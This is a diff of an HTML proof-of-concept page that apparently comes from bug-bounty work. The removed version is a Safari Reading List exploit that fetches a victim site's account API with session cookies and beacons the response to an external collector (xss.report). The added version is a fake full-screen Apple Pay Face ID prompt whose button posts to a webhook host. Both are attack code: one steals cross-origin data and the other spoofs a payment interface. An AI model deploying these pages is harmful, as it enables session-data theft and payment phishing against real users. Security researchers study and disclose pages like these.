@@ -1,36 +1,62 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Reading List Leak PoC</title>
-  <meta charset="UTF-8">
+  <meta charset="utf-8">
+  <title>Apple Pay</title>
+  <style>
+    html, body {
+      margin: 0;
+      background: black;
+      color: white;
+      font-family: -apple-system;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+    .prompt {
+      background: #1c1c1e;
+      padding: 30px;
+      border-radius: 20px;
+      text-align: center;
+    }
+    .faceid {
+      font-size: 40px;
+      margin-bottom: 20px;
+    }
+    .btn {
+      background: #007aff;
+      color: white;
+      padding: 12px 24px;
+      border-radius: 10px;
+      font-size: 18px;
+      margin-top: 20px;
+      border: none;
+    }
+  </style>
 </head>
 <body>
-  <h1>Testing Reading List Data Leak</h1>
 
-  <script>
-    // Fungsi utama yang akan dijalankan ulang saat dibuka dari Reading List
-    async function exploit() {
-      try {
-        const res = await fetch("https://target-victim-site.com/api/account", {
-          method: "GET",
-          credentials: "include", // Critical: include session cookies
-          mode: "cors" // Bypass attempts
-        });
+<div class="prompt">
+  <div class="faceid">🔒 Face ID</div>
+  <div>Confirm with Side Button</div>
+  <button class="btn" onclick="steal()">Confirm</button>
+</div>
 
-        // Jika Safari salah menganggap origin ini "trusted" → bisa baca body!
-        const text = await res.text();
+<script>
+function steal() {
+  fetch('https://your-webhook.site/pwn', {
+    method: 'POST',
+    body: JSON.stringify({ confirmed: true })
+  });
+  alert("Payment confirmed.");
+}
 
-        // Kirim hasil ke server bounty hunter
-        navigator.sendBeacon("https://xss.report/c/waduh", text);
-      } catch (err) {
-        console.error("Blocked or failed:", err);
-      }
-    }
+window.onload = () => {
+  document.documentElement.requestFullscreen().catch(() => {});
+};
+</script>
 
-    // Delay agar Reading List sempat load total
-    window.addEventListener("load", () => {
-      setTimeout(exploit, 1000);
-    });
-  </script>
 </body>
 </html>
